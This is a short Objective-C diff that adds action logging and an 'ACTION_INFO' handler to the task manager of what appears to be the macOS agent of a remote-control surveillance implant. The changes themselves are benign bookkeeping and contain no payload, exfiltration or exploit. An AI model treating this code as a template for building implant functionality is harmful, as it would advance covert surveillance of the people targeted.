@@ -25,6 +25,7 @@
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
+#import "RCSMInfoManager.h"
 #import "RCSMSharedMemory.h"
 #import "RCSMTaskManager.h"
 #import "RCSMConfManager.h"
@@ -273,6 +274,10 @@ static NSLock *gSyncLock                  = nil;
       //
       [[NSFileManager defaultManager] removeItemAtPath: configurationUpdatePath
                                                  error: nil];
+
+      RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+      [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
+      [infoManager release];
     }
   
   [configurationPath release];
@@ -307,6 +312,10 @@ static NSLock *gSyncLock                  = nil;
               //
               if ([mConfigManager loadConfiguration] == YES)
                 {
+                  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+                  [infoManager logActionWithDescription: @"New configuration activated"];
+                  [infoManager release];
+
                   // Clear the command shared memory
                   [gSharedMemoryCommand zeroFillMemory];
                   
@@ -329,7 +338,10 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                   infoLog(@"An error occurred while reloading the configuration file");
 #endif
-                  
+                  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+                  [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
+                  [infoManager release];
+
                   return NO;
                 }
             }
@@ -2950,6 +2962,20 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
+    case ACTION_INFO:
+      {
+        if ([[configuration objectForKey: @"status"] intValue] == 0)
+          {
+            NSNumber *status = [NSNumber numberWithInt: 1];
+            [configuration setObject: status forKey: @"status"];
+
+            [mActions actionInfo: configuration];
+            status = [NSNumber numberWithInt: 0];
+            [configuration setObject: status forKey: @"status"];
+          }
+
+        break;
+      }
     default:
       {
 #ifdef DEBUG_TASK_MANAGER
@@ -3025,7 +3051,7 @@ static NSLock *gSyncLock                  = nil;
                 action: (u_int)actionID
 {
 #ifdef DEBUG_TASK_MANAGER
-  verboseLog(@"Registering action ID (%d) with type (%d)", actionID, actionType);
+  verboseLog(@"Registering action ID (%d) with type (%d) content (%@)", actionID, actionType, actionData);
 #endif
   NSMutableDictionary *actionConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
  
